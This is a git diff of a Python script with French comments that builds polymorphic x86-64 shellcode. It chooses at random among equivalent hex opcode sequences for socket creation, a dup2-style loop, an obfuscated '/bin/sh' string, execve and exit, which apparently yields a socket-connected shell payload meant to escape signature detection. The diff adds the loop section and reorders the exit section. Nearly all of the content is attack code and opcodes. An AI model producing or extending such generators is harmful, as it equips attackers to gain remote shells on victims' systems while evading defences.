@@ -44,13 +44,17 @@ create_socket_6 = ["4831D2", "4D31C04C89C2", "B20180EA01"]
 
 create_socket_syscall = ["0F05"]
 
+# Constant = 7df4 #.loop
 
-###### CONNEXION SOCKET ######
+###### XOR START LOOP ######
 
+# xor rax, rax [Default] -> 4831c0
 
+# xor r8, r8
+# mov rax, r8 -> 4d31c04c89c0 
 
-
-
+# mov al, 1
+# sub al, 1 -> b0012c01
 
 ###### LOOP ######
 
@@ -66,6 +70,8 @@ create_socket_syscall = ["0F05"]
 # add al, 0xb
 # add al, 0xb -> adda0badda0badda0b
 
+# Constante = B0210F0548ffce7df4
+
  ###### XOR BEFORE SYSCALL ######
 
 # xor rax, rax
@@ -78,13 +84,6 @@ create_socket_syscall = ["0F05"]
 # xor rax, rdx
 # xor rdx, rdx -> 4889d04831d04831d2
 
- ###### SYSCALL EXIT ######
-
-# mov al, 60 -> B03C
-# mov al, 99 - sub al, 39 -> B0632C27
-# mov al, 30 - add al, 30 -> B01E041E
-# mov dl, 60 - mov rax, rdx -> B23C4889D0
-
 ####### /bin/sh ######
 
 # mov rbx, 0x68732f6e69622f2f [Default] -> 48BB2F2F62696E2F7368
@@ -96,6 +95,7 @@ create_socket_syscall = ["0F05"]
 # mov rbx, 0x68733f5bd2cb3030 -> 48BB3030CBD25B3F73684881EB6969ED0F 
 # sub rbx, 0xfed6969
 
+# Constante = 50534889E750574889E6
 
 ###### SYSCALL EXECVE ######
 
@@ -103,6 +103,15 @@ create_socket_syscall = ["0F05"]
 
 # mov al, 0x3a
 # add al, 0x01 -> B03A0401
+
+# Constante = 0f05
+
+ ###### SYSCALL EXIT ######
+
+# mov al, 60 -> B03C
+# mov al, 99 - sub al, 39 -> B0632C27
+# mov al, 30 - add al, 30 -> B01E041E
+# mov dl, 60 - mov rax, rdx -> B23C4889D0
 
 ###### XOR LAST SYSCALL ######
 
@@ -114,8 +123,11 @@ create_socket_syscall = ["0F05"]
 # mov dl, 1
 # sub dl, 1 -> b20180ea01
 
+# Constante = 0f05
+
 list_exit = ["b03c", "b0632c27", "b01e041e", "b23c4889d0"]
 
+list_xorloop = ["4831c0", "4d31c04c89c0", "b0012c01"]
 list_loop = ["b021", "b0110410", "b0382c17", "adda0badda0badda0b"]
 list_xor = ["4831c04831d2", "4831d24831c0", "4889d04831d04831d2"]
 list_binbash = ["48BB2F2F62696E2F7368", "48BB310A4D586E2F73684881C3FE241511", "48BB3030CBD25B3F73684881EB6969ED0F"]
@@ -124,6 +136,8 @@ list_xorsyscall = ["4831FF", "4D31C04C89C2", "b20180ea01"]
 
 shellcode += random.choice(list_exit)
 print(shellcode)
+
+# Fonction qui permet l'ajout des /xFF/
 
 def shellcodize(s):
     shellcode = 'X'
